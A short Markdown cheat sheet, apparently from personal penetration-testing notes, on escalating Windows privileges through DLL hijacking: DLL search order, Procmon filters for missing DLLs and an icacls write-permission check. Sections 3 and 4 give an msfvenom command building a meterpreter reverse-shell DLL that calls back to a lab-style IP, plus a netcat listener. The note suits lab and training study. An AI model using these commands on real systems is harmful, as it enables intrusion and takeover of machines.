---
title: DLL hijacking
category: win privesc
order: 1
---

[WPE-05 - DLL Hijacking](https://pentestlab.blog/2017/03/27/dll-hijacking/)
In Windows environments when an application or a service is starting it looks for a number of DLL’s in order to function properly. If these DLL’s doesn’t exist or are implemented in an insecure way (DLL’s are called without using a fully qualified path) then it is possible to escalate privileges by forcing the application to load and execute a malicious DLL file.

It should be noted that when an application needs to load a DLL it will go through the following order:

1.    The directory from which the application is loaded
2.    C:\Windows\System32
3.    C:\Windows\System
4.    C:\Windows
5.    The current working directory
6.    Directories in the system PATH environment variable
7.    Directories in the user PATH environment variable

# 1 find process with missing dll
use procmon from sysinternals to check for missing dlls ("NAME NOT FOUND")

## 1.1 filters
Process Name is <[Value]>
Result is <[NAME NOT FOUND]>
Path ends with .dll*

# 2 confirm that you have write permissions to any of the folders
```
c:/path/to_inject/dll>: icacls .
 risus-PC\risusUser:(I)(OI)(CI)(F)
```

importantn values:
```
a sequence of simple rights:
     N — no access
     F — full access
     M — modify access
     RX — read and execute access
     R — read-only access
     W — write-only access
     D — delete access
```


# 3 create dll
## 3.1 reverse shell
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f dll -o evil.dll
```
## 3.2 create user
TODO

# 4 start listener
```
nc -nlvp 4444
```

# 5 copy dll to path and rerun service/program
